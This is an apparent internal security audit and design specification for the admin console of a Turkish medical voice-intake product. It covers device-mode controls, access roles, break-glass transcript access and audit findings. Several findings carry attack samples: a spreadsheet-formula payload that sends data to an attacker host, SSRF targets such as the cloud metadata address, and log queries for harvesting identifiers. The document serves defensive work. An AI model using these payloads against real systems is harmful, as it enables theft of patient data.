# 08 · Admin console, observability, CI/CD and the self-hosting matrix (v1.4, 21 Aug 2026)

> One console (`apps/admin-web`) for three audiences: **operators** (is it up, is it fast, what does it cost), **clinical leads** (is it safe, is it good, what should change) and **compliance** (who saw what, where did data go). Everything it shows comes from the same telemetry the runtime already emits; nothing in it is a screenshot of a vendor dashboard. Every model and service on the PHI path is **self-hostable**, and the console shows, per component, whether it is *currently* self-hosted and healthy.

## 0a. What this console actually controls — read this before any other section
> Added 25 Aug 2026 with the admin-console security audit. This framing governs every section below; where a later section contradicts it, this section wins and the later one is the defect.

**This console controls a medical device function.** Three of its switches are not operational controls and must never be rendered, permissioned or reasoned about as if they were:

- **`device_functions`** is the **MDSW boundary** (`06 §0.6`, INT-117). Off, the product is non-device documentation software. On, it is automated red-flag triage that instructs a **lay patient** to call 112, plus automated interpretation of instrument scores — MDR/TİTCK **Rule 11 → Class IIb** (`00 §2`; MDCG 2019-11 Annex IV names the case verbatim). The switch does not change a feature; it changes what the product *is*.
- **`acoustic` (M3)** is an **investigational-device module** (`00 §3` D4, `03 §4.7.4`), reachable only under an asserted, approved study. There is no shadow mode and no commercial-tenant path.
- **Protocol packs** carry **red-flag rules that route patients to 112**, including the Turkish `action_tr` script the patient actually hears. A pack edit is a clinical-safety edit whether or not it touches a rule.

So the failure modes of this console are a **patient-safety event**, a **device-classification breach**, or **unlawful processing of special-category data** (KVKK Art. 6 as amended by Law 7499, aligned to GDPR Art. 9). They are not an outage. Every control below is sized to those three, which is why several are deliberately more expensive than an operations console would justify.

**And a correction, which is the reason this audit exists: `§1.2` promises "no PHI in the console by default", and `§3`, `§7` and `§10` break that promise three times over.** (a) The Langfuse annotation queue in *Clinical quality & safety* stores prompts and completions **verbatim**, and the extraction prompt *is* the patient's transcript. (b) The embedded Grafana panels read Loki and Tempo, which carry log lines and spans from the PHI path. (c) The break-glass view opens a "de-identified transcript" that **`10 §3` itself concedes cannot be de-identified in Turkish at better than 0.85–0.95 recall** — 0.3–1.0 expected identifier leaks per session. None of the three keeps the promise. The repair is not a better redactor; it is to **stop asserting de-identification and start governing the access** (§2.5).

## 0b. The three criticals

### F1 — CRITICAL. Embedded Grafana, Langfuse and Unleash are a parallel authorization plane that bypasses every `/admin/*` guard
An iframe only renders if the user already holds a session **on that origin**. So every console user who needs a chart gets a Grafana account — and then opens Grafana **directly**, goes to Explore, and runs `{service="voice-runtime"} |= "TC"` over Loki, or a TraceQL query over `extraction` spans. **Langfuse is worse by design**: it exists to store prompts and completions verbatim, so its span store is a transcript store with its own login page. Unleash is the write-side twin — its API tokens flip flags with **no `audit.v1` row**, and CI runners hold Unleash tokens. Tenant isolation does not exist in any of the three: `tenant_id` is a **label, not a row-level security boundary**. `§8`'s "all admin writes emit `audit.v1`" is true and irrelevant, because none of this transits `/admin/*`.

**Fix.** Delete the iframe pattern. Every panel is **server-rendered through `services/api/admin`**, which builds the query server-side from the caller's token claims — the browser never names a datasource. Grafana, Langfuse, Loki, Tempo and Unleash are **unreachable from any browser origin** at the ingress (operator access is through the cluster, not the console). Langfuse runs in **hashed-content mode by default**, with a raw-content project reachable only under a break-glass grant (§2.5). Safety flags leave Unleash entirely for the gated-capability service (§8.2). Proven by invariant 48 `console_isolation_guard` (`10 §9.1`).

### F2 — CRITICAL. `device_functions` is absent from this file; the most dangerous switch has no surface, no alert, no metric and no attribution
It appears nowhere in `08` — not in `§3`'s module table, not in `§4`'s catalogue, not in `§5`'s alerts, not in `§8`'s API. INT-188 lists it as a "safety flag", which means that **as specified the flip happens in Unleash's UI, or with an Unleash API token**. Enabling it for a commercial tenant places an **uncertified Class IIb device into service**; turning it back off does not un-place it, and the sessions that ran in device mode are evidence.

**Fix.** A **gated-capability service** whose sole write path is `POST /admin/device-mode`, tier-3 (§8.2): four-eyes by `clinical_lead` **+** `qms_owner`, both WebAuthn, **distinct authenticators**, **neither from a tenant organisation**; a Study Registry reference validated server-side (F3); **write-ahead audit** — the row and the chain head advance *before* the flag takes effect; an immediate page; and a **60 s reconciliation probe** that compares intended against effective state and **fails closed** on divergence. No key matching the safety list may exist in the generic flag store at all (invariant 34).

### F3 — CRITICAL. The study assertion cannot be forged because nothing verifies it — and it will be left asserted after the study closes
Invariant 23 (`10 §9.1`) says `{study_id, protocol_version, ICF_version, approval_date}` "all assert". Nowhere is it stated **where those fields live or who may write them**. If they are config, then whoever edits the deploy config **mints a clinical investigation**. There is no signature over the ATADEK decision or the TİTCK permission, no `approval_valid_until`, no insurance reference and no site check (`00 §4` B5: the site must be Acıbadem MAA Üniversitesi's uygulama ve araştırma merkezi, which a general private hospital is not).

**And the amendment gate only fires if a human tells the system an amendment happened.** The realistic sequence is not an attack: study runs → site amends the protocol → investigator updates the paper file → nobody edits config → the gate keeps passing on a stale `protocol_version` → patient audio keeps accruing under an ICF version nobody signed. That is an unapproved device investigation (TCKAY m.11) **and** unlawful special-category processing, simultaneously. **[counsel]**

**Fix.** A first-class **Study Registry** (§3, new module) holding signed records `{study_id, protocol_version, ICF_version, approval_date, approval_valid_until, atadek_no, titck_permit_no, insurance_ref, site_id, PI}` plus **document hashes** of the approval letters. The gate reads `approval_valid_until` and **de-asserts on expiry with no grace**. A daily probe fails closed on a missing, expired or hash-mismatched row; ticket at 14 days to expiry, page at 3. Weekly reconciliation against the investigator's enrolment log. And a **study-close runbook** that de-asserts the module, seals the research store and starts the ≤ 12-month destruction clock (F18).

## 0c. Finding register F4–F19 — each with the path that actually gets walked

**F4 · HIGH — replay is an unlogged bulk read, and "de-identified" is not.** `03 §4.8`'s `replay(event_log)` is a **test harness**: no authz, no rate limit, no audit. An SRE with prod credentials loops it over session ids while `sec.break_glass_total` reads zero and the Security module shows a clean week. Separately, clinical narrative is **self-identifying at clinic scale** — "58, rheumatology follow-up, Maslak, six meds" is one person in that clinic on that day. Stop calling replay output de-identified; treat it as PHI. *Fix:* replay against production only via `POST /admin/sessions/{id}/replay` under a break-glass grant; CI binds the offline harness to synthetic fixtures and a static scan proves no job target wires it to a production connection string (invariant 39).

**F5 · HIGH — the audit chain is tamper-evident only against someone who cannot recompute it.** A `platform_admin` with DB access edits a row **and recomputes the chain forward**; the daily verifier goes green. INT-016's acceptance test "flips one row and the verifier detects it" — it does not test **flip-and-repair**, which is the actual attack. And `§6` already records, unresolved, that **Garage does not implement S3 Object Lock, silently voiding the WORM guarantee** the 10-year audit log depends on. *Fix:* `svc-audit-writer` holds the **only** INSERT grant, with UPDATE and DELETE granted to no role anywhere; the chain head is published **hourly outside the `platform_admin` blast radius** — a second organisation's object store, or a KEP/e-imza timestamp from a Turkish TSP (the KEP machinery already exists for DPA execution); the daily verifier checks against the **external** head, not the local one; the MinIO/Garage decision closes **before P1**, not "explicitly, someday"; and `seq` gaps alert independently of hash failure, because deletion leaves the chain valid.

**F6 · HIGH — a published pack changes without touching a rule.** Two paths. **(a)** `12 §3.1` grants HOSPITAL the `override_text` op, and `12 §3.2`'s deny-list protects `/life_threat`, `/instruments`, `/ek4*`, `/level`, `/disposition`, `/when` and `/must_ask` — **but not `action_tr`, the Turkish sentence the patient hears when a red flag fires.** Hospital IT rewrites the 112 instruction; every rule still fires, every invariant still passes, and the patient is told the wrong thing. **The rule is protected and the sentence is not.** **(b)** "Regenerate clips" (§3, Protocols) resynthesises the manifest, and invariant 7 asserts that Talker *text* equals `text_tr` — an assertion about text, not about audio. *Fix:* invert the hospital capability from deny-list to a **pointer allow-list** (invariant 42; cross-reference for `12 §3.2`, not edited here); make `00 §5` Q10's round-trip gate — synthesise → transcribe → diff → fail — **blocking**, and re-run it on every regeneration (invariant 43); and make pack promotion tier-2 with L2 evidence (`09 §2`) **computed server-side from telemetry, never asserted by the promoter**.

**F7 · HIGH — there is no emergency un-publish and no RTO.** A pack at 100 % routes a real RED to GREEN. What the console offers: *stop canary* (nothing is canarying at 100 %), *CI/CD rollback* (moves Argo manifests — while `§9` says protocol changes deploy **as data**, so the manifest is not what is wrong), or a git revert through the full review gate. Meanwhile sessions pin `protocol_hash` at start, so in-flight patients keep the bad pack to the end. *Fix:* `POST /admin/protocols/{id}/quarantine` with **asymmetric authority** — any single `clinical_lead` or `sre_oncall` may quarantine; un-quarantine is tier-2. New resolutions fall back to the last `known_good` version. In-flight **safety-quarantined** sessions switch at the next section boundary, recorded as an event so replay stays byte-exact (inv. 20). **Stated RTO: ≤ 60 s to quarantine for new sessions, ≤ 5 min from decision including tenant notification**, drilled like the restore drill. And the part usually forgotten: a **re-triage sweep** that re-evaluates every session run under the quarantined version within the retention window and raises a clinic inbox entry for anything that is now RED or YELLOW.

**F8 · HIGH — SSRF and mass PHI redirection through connector endpoint fields.** `tenant_admin` is hospital IT, named in `10 §1`'s adversary model, and `§3` lets them type a URL that our server then fetches **from inside the PHI network, holding OpenBao credentials**. Point it at `169.254.169.254`, `http://openbao:8200` or `http://unleash/api/admin/features` — even a failure discloses, because the error carries the response body. The bigger version is quieter: point it at an attacker-controlled host and **every `push_previsit` delivers full clinical notes there indefinitely, looking exactly like normal operation** on every dashboard we have. *Fix:* destinations are **not free text**. They are registered out-of-band at onboarding, bound to the signed DPA, and the console field is a **select** over the registry. The egress proxy denies literal IPs and private / link-local / metadata ranges, **resolves once and pins the address with re-validation on connect** (DNS rebinding), and disables redirects. An endpoint change is tier-2 by `platform_owner` — **not** `tenant_admin` — and pages (invariant 46).

**F9 · HIGH — IDOR, and aggregates that are single-patient at clinic scale.** `GET /admin/voice/metrics?tenant=` — RLS protects the database, but only if the tenant GUC is set from the **token claim**. If it is set from the **request**, a `tenant_admin` for Hospital A passes `?tenant=hospital-b` and RLS faithfully returns Hospital B. `§8` does not say which, and pooled connections make the wrong version the easy one to write. Separately, `session.abandon_step` + `triage.events_total{rule}` + `wait.checkin_to_seen_min` filtered to one small clinic on one day **identifies individuals**; the k ≥ 10 helper (INT-171) is applied to Loop 2 and **not** to console reads. *Fix:* tenant scope comes from the OIDC claim; the parameter is **rejected** for every role except `platform_owner`; proven by extending INT-180's role-matrix test into a **role × tenant** matrix over every route (invariant 37); a per-request DB role so RLS is actually exercised; and the k ≥ 10 helper reused on every console aggregate carrying a time filter and a clinic filter.

**F10 · HIGH — four-eyes as specified is forgeable, and it covers the wrong list.** If the approver is a **field the actor fills in**, it is theatre. Even with a real second login, nothing in `§3` or `10 §2` requires a **distinct human**: a personal account plus a `svc-admin` account satisfies it, and so does a TOTP seed shared in a team vault. And the covered list — kill switch, profile change, S2S enable, proposal approval, break-glass — **omits `device_functions`, the study assertion, pack promotion, connector endpoint changes, DSAR deletion, key rotation and privileged role grants, every one of which is more dangerous than the profile change it does cover.** *Fix:* four-eyes becomes a **server-side pending-action protocol** — actor initiates, 15-minute TTL, and a **different `sub`, on a different WebAuthn authenticator (distinct AAGUID and credential id), in their own session on their own device** approves; both identities and both assertion signatures land in the audit row **before** execution. For tier-3, actor and approver may not share an employer. Self-approval attempts are rejected **and metered** (invariant 32).

**F11 · MEDIUM-HIGH — privilege escalation through clinician provisioning.** `08` never describes how a clinician account comes into existence, yet such an account reads **every note in the tenant** — and it is presumably done by `tenant_admin`, i.e. hospital IT, an adversary in `10 §1`. Provision an account for a person who does not exist and read notes at scale; each read is indistinguishable from care. *Fix:* provisioning requires a **verified professional identifier** and approval by the new `tenant_clinical_responsible` role — **never by IT**; quarterly review signed with KEP/e-imza by the medical director; auto-disable at 60 days without login; and an anomaly signal comparing notes-viewed against the clinician's appointment list, **which the connector already knows**.

**F12 · MEDIUM-HIGH — PHI in errors and crash reports, beyond the defect already flagged.** `10 §3` catches `include_local_variables`. It does not catch that **Pydantic's `ValidationError` includes the offending input in its message by default** — so a malformed extraction turns the patient's sentence into an error string, into Loki, onto the Ops dashboard, into the crash reporter, in one hop. Same for Celery task kwargs: `extract_slots` carries transcript text, and a task failure logs its kwargs. *Fix:* a `SafeError` boundary that converts exceptions to `{error_code, correlation_id}` **before any logger sees them**, with full detail only in an encrypted store behind a break-glass grant; configure Pydantic to omit `input`; never log `task_kwargs`; and upgrade `10 §8`'s PHI scan from **fixtures to runtime** (invariant 36).

**F13 · MEDIUM — CSV/formula injection in the export we are legally obliged to produce.** A patient types `=HYPERLINK("https://attacker/?d="&A1,"tıkla")` into a free-text field. The **DSAR export** is the perfect vehicle: the attacker controls the content, knows a compliance officer will open it in Excel, and **KVKK m.13 obliges us to produce it within 30 days**. *Fix:* export XLSX with text-typed cells; if CSV, prefix and quote per OWASP and strip control characters and CRLF; CI fuzzes every export serialiser (invariant 47).

**F14 · MEDIUM — supply chain, in the one place it reaches PHI.** The console is the single artefact with a large npm tree running **inside the PHI trust boundary**, in a browser session holding a privileged Keycloak token and rendering break-glass transcripts. `10 §4` says "strict CSP", but Next.js App Router without nonce plumbing typically ships `unsafe-inline`, and the Grafana iframes require a third-party `frame-src` — the same hole as F1, arriving from the other side. *Fix:* nonce-based CSP with **no `unsafe-*`**, `require-trusted-types-for 'script'`, SRI, `npm ci --ignore-scripts`, and a CI test that fetches the built app and **asserts the emitted header**. A policy nobody verifies is a policy nobody has (invariant 48).

**F15 · MEDIUM — break-glass has no legal basis, and the patient is never told.** See §2.5 and §2.6. **[counsel]**

**F16 · MEDIUM — instrument licensing is enforced nowhere.** C-SSRS and WHO-5 are **BLOCKED** (`00 §2`, B6). `04 §2` puts "C-SSRS full" inside `cluster.mental_health`, and `09 §2` serves the cluster pack to any branch lacking an L1 pack. So enabling `mental_health` for a tenant — a routine *Tenants* action — **ships an unlicensed electronic Turkish C-SSRS**. Exposure: $40k + $7.5k/yr + $4/administration, plus FSEK 5846 translation rights (art. 71, criminally actionable), plus administering an instrument whose Turkish validation covers **adolescents 12–18 only** to adults. `12 §3.2` protects instrument **item text**; nothing protects instrument **usage** from a console toggle. *Fix:* `packages/protocols/instruments/licences.yaml` carrying status / holder / evidence / expiry / per-administration fee; a **compile-time and runtime gate** refusing anything not `GO`; and an *Instruments & licences* surface with an administration counter (invariant 45).

**F17 · LOW-MEDIUM — the kill switch requires four-eyes, which is backwards.** The kill switch moves the system to the **safer** state (typed mode). Requiring a second approver at 03:00 to make the product safer is an availability control placed on a safety control, and the predictable outcome is that **it does not get pulled**. *Fix:* **asymmetric authority throughout — safe direction one key, dangerous direction two.** Any single `sre_oncall` or `clinical_lead` may engage the kill switch, quarantine a pack, disable a lane, revoke a token, or turn `device_functions` **off**. Formalised as tier T1 in §8.2.

**F18 · LOW-MEDIUM — the sealed research store has no role, no surface and no clock.** It is the **only place in the product where raw patient audio persists** (`03 §4.7.4`); everywhere else invariant 27 forbids a write path. *Fix:* an `investigator` role scoped to a single `study_id`; a *Research store* surface showing key custody, access log, per-file retention countdown and destruction evidence; and automated destruction at the ≤ 12-month ceiling — **DEST-2017 (RG 30224) requires destruction records to be kept ≥ 3 years**, so the evidence outlives the data by design. **[counsel]** on the ceiling's application to investigational audio.

**F19 · HIGH-value — the RED acknowledgement SLA has no observability at all.** `02 §8` sets RED → clinic inbox **≤ 60 s** and human acknowledgement within a tenant SLA (default 4 business hours) **regardless of connector presence**. `§4 E` counts `triage.events_total` — REDs that **fired**. Nothing counts REDs that **nobody answered**. There is no queue, no clock, no metric and no alert. **This is the one finding where the missing surface is the difference between an alert and an outcome.** *Fix:* a *Safety queue* module (§3) with `clinic.red_ack_latency_min` and `clinic.red_unacknowledged_total`, paging at SLA breach, and `02 §2b`'s reschedule/cancel-on-RED transitions raising an entry into the same queue (invariant 49).

## 0. Relationship to `10`
`10_SECURITY_AND_TECHNICAL_MONITORING.md` defines the monitoring contract every service implements (`/healthz` `/readyz` `/metrics` `/version`, OTel with redaction, SLOs, probes) and the security controls per feature; this file defines how the console **renders and controls** them. If a signal is not in the catalogue (§4) it does not exist; if a control is not in `10 §9` it is not done.

## 1. Principles
1. **Observe the conversation, not just the servers.** Per-turn voice metrics (EOU delay, TTFT, TTFB, round-trip, interruptions), per-Work latency, insertion-window wait and RED preemption are first-class, alongside CPU and queues.
2. **No PHI in the console by default — and this principle was not being kept.** Aggregates and ids only. Patient content is reachable through **exactly one** path, `POST /admin/break-glass` (§2.5), proven by an import-boundary test; what it opens is a **redacted best-effort transcript that is still PHI**, never a "de-identified" one. See `§0a` for the three places the old wording was contradicted, and `§0b` F1 for the vendor consoles that bypassed it entirely.
3. **Control is audited and gated — asymmetrically.** The **dangerous** direction takes two distinct humans; the **safe** direction takes one (§8.2). A second approver on the kill switch is an availability control on a safety control, and it is removed (`§0c` F17). Every gated action is declared in the `DangerousAction` registry with its tier, approver rule, runbook and alert, and CI fails on a mutating route that is not registered.
3a. **The audit row is written before the mutation, not after.** A mutation that succeeds and then crashes before logging is the failure mode that matters, and write-ahead is the only ordering that survives it (§8.1).
4. **Self-host by default; vendors are accelerators.** The PHI path must have an in-country option for every hop; the console fails a release if any enabled component on that path lacks a self-hosted fallback.
5. **CI/CD is visible where decisions are made.** Pipeline, eval gates, deploy health and canary state sit next to the KPIs they protect.

## 2. Roles, separation of duties and access to patient content (Keycloak SSO + MFA, self-hosted; RBAC + ABAC by tenant)
> Rewritten 25 Aug 2026 with the security audit. The previous version was a one-line list and had four structural problems: **`platform_admin` was unconstrained** and appeared on no separation-of-duties list; the four-eyes list covered five actions and omitted seven more dangerous ones (`§0c` F10); four roles that the design already depends on did not exist; and **the author and the approver of a RED rule are the same person in practice**.

### 2.1 Role set
| role | scope | may reach patient content? | notable limits |
|---|---|---|---|
| `platform_owner` | everything, all tenants | only via break-glass (§2.5) | **replaces the unconstrained `platform_admin`.** Named on every separation-of-duties list; cannot approve their own action; cannot grant themselves a role; quarterly review needs an **external** signature (§2.7) |
| `platform_admin` | infrastructure, no clinical surfaces | no | **narrowed:** no pack promotion, no device flag, no study assertion, no connector endpoints, no audit config. Holds no INSERT/UPDATE/DELETE grant on the audit table (`§0c` F5) |
| `tenant_admin` (hospital IT) | tenant branding, contacts, users' *technical* onboarding | no | **narrowed — removed: connector endpoints (F8), pack enablement (F16), key rotation, clinician provisioning (F11).** `10 §1` names hospital IT as an adversary; the role must match |
| `tenant_clinical_responsible` **(new)** | one tenant, clinical governance | notes within the tenant, in the ordinary course of care | **approves clinician accounts** (never IT) and **acknowledges REDs** (§3 Safety queue). Held by the medical director or delegate; signs the quarterly clinician review with KEP/e-imza |
| `clinical_lead` | protocol review, safety queues, quarantine | only via break-glass | tier-3 approver alongside `qms_owner`; may quarantine a pack alone (T1) |
| `qms_owner` **(new)** | ISO 13485 / IEC 62304 device change control | no | **required by `§9`'s release gates and owned by nobody today.** Second signature on `device_functions`, on the study assertion and on promotion to all tenants |
| `investigator` **(new)** | the sealed research store, **one `study_id`** | study audio for that study only | **no production clinical data, ever.** Surface in §3; destruction clock in `§0c` F18 |
| `auditor` **(new)** | read-only evidence export | no | for a KVKK inspector, a notified body or counsel. Reads audit rows, registries, drill records and attestations; writes nothing; every read audited |
| `sre_oncall` | operations, T1 safe-direction actions | no | may pull the kill switch, quarantine a pack, disable a lane, revoke a token, turn `device_functions` **off** — each alone |
| `compliance_officer` | consent, DSAR, transfer register, break-glass approval | via break-glass | reviewer for INTAKE staff in the quarterly review |
| `researcher` | de-identified aggregates, k ≥ 10 | no | k ≥ 10 now enforced on **console reads** too (`§0c` F9) |
| `support` | one patient, one grant, expiring | only under a **patient-granted** expiring grant on the Doctor Link model | "ticket-scoped" with no mechanism is a comment, not a control. The grant is the mechanism |

### 2.2 The separation that does not exist, stated as an operating constraint
CODEOWNERS gives the **mechanism** for separating the author and the approver of a red-flag rule. It does not give the **people**: `00 §3` D10 records review capacity as one of the three binding constraints on the roadmap, and with one reviewing physician the author and the approver are **one human**. Do not write this down as solved. The named cross-check is that **a second clinician of *any* branch reviews safety-string and rule changes, even outside their specialty** — a general-medicine reader catching "this sentence tells the patient the wrong thing" is worth more than a specialist reader who never arrives.

### 2.3 MFA, step-up and sessions
- **MFA is mandatory for every role.** **Phishing-resistant WebAuthn is mandatory** for anything touching a protocol pack, the device flag, the study assertion, patient content, connector endpoints or audit configuration. TOTP is phishable, and a phished `platform_owner` plus a phished second approver is a device-mode flip.
- **Step-up is a fresh, single-use WebAuthn assertion at the moment of the action**, and its credential id goes in the audit row. "Remember this device for 15 minutes" is how a four-eyes ceremony becomes one person with two tabs.
- Session ≤ 8 h; **30-minute idle timeout on any session that can reach PHI**; IP allow-list for the console.

### 2.4 Service accounts and offboarding
- **Service accounts** are k8s service accounts + SPIFFE identities with OpenBao dynamic credentials at TTL 24 h. **A service account never holds a console role.** New: **`svc-audit-writer` holds the only INSERT grant on the audit table**, and UPDATE/DELETE are granted to no principal anywhere (`§0c` F5).
- **Offboarding**: Keycloak is the single source of truth. An SCIM/HR-triggered disable revokes OIDC sessions **and** OpenBao leases **and** the Grafana / Langfuse / Unleash accounts **in one action** — today those are three separate identity stores, which is part of F1 and is the reason F1's fix removes them from browser reach. 60-day auto-disable on no login. A departed `clinical_lead`'s pending four-eyes approvals **expire**; they do not sit in a queue waiting for someone to inherit them.

### 2.5 The section that matters most — who can see a patient's transcript
As designed there were **four paths and one of them was governed**:

| path | who | governance | logged where |
|---|---|---|---|
| break-glass view | console roles | reason + 4-eyes + audit | `audit.v1` |
| **Langfuse LLM spans** | anyone with a Langfuse account | **none** | Langfuse only |
| **Grafana Explore over Loki/Tempo** | anyone with a Grafana account | **none** | Grafana only |
| **`replay(event_log)`** | anyone with prod credentials | **none** | **nowhere** |

And `10 §3`'s patient-visible access log covers **shares only** — Doctor Link. So the honest answer to *"does the patient ever find out a member of staff read their intake?"* is: **only if they file a KVKK m.11 request, and the DSAR export is not specified to include staff reads at all.**

**One path, specified.** Patient content is reachable **only** through `POST /admin/break-glass`, proven by an **import-boundary CI test** — the precedent exists: `12 §5` uses exactly this shape to keep the triage attestor out of `extraction/`, `observers/` and `talker/`. The ceremony:

1. A **closed-category reason** plus ≥ 20 characters of free text.
2. A **distinct** human approver, different WebAuthn authenticator, own session (§2.3, F10).
3. **For processor tenants, a controller instruction reference** — as a processor we may act only on documented controller instruction, and without the reference the access has no basis to record.
4. Scoped to **one session id**, TTL ≤ 60 min, **single use**.
5. What opens is a **redacted best-effort transcript treated as PHI**: watermarked with the actor and timestamp, **no download, no bulk pagination, no adjacent-session navigation**.
6. The audit row is written **before** the read (§8.1).
7. **The patient's own access log gains an entry within 24 h** — date, actor **role** (not name), reason category, duration.

That last item is the KVKK m.11/m.13 answer, it makes the DSAR export complete by construction, and it is the single change that most improves the honesty of the design. **Rate limits are the intrusion detector, not a hygiene control**: more than 3 grants per actor per 30 days, or any out-of-hours grant without an open P1, pages (§5).

### 2.6 Legal basis for staff access — a genuine gap **[counsel]**
In the hospital deployment we are a **processor**, and staff access rests on documented controller instruction plus KSVY m.5/m.7 need-to-know plus Karar 2018/10 undertakings. That is workable. In the consumer deployment we are the **controller**, and it is not: post-7499 the health regime aligns to **GDPR Art. 9**, so legitimate interest is unavailable, and m.6/3's care ground runs to persons **under a healthcare obligation of secrecy** — **an INTAKE support engineer is not that person**. The purposes enumerated in `06 §2` contain **nothing covering staff access** at all. **Inference for counsel:** a `support_access` **explicit-consent** purpose is needed, unbundled from the others and obtained **at the point of the support request**, not at onboarding. Cross-reference for `06 §2`; not edited here.

### 2.7 Quarterly access review — generated, not assembled
The review is **produced by the console from Keycloak, the role grants and the audit log**, not assembled by hand into a spreadsheet, and it is **signed with KEP/e-imza**. Reviewers: `tenant_clinical_responsible` for clinician accounts, `compliance_officer` for INTAKE staff, and `compliance_officer` **plus an external signature** for `platform_owner`. **Enforcement is what makes it happen: a review older than 100 days downgrades every `platform_owner` and `tenant_admin` session to read-only and pages.**

## 7. Data flow and storage
OTel SDKs in api / voice-runtime / workers → OTel Collector → Prometheus (metrics), Loki (logs, PII-redacted processor), Tempo (traces); LLM spans also → Langfuse (OTel endpoint) with scores from evals and annotation queues. `services/metrics` materialises the catalogue in Postgres (hourly rollups; ClickHouse when volume requires) and serves `/admin/metrics/*`. `services/probes` runs synthetic checks every 60 s and writes the registry table the console reads. Satisfaction events (`csat.v1`, `nps.v1`, `clinician_pulse.v1`) are first-class events on Redis streams with a schema in `packages/clinical-schemas/events`.
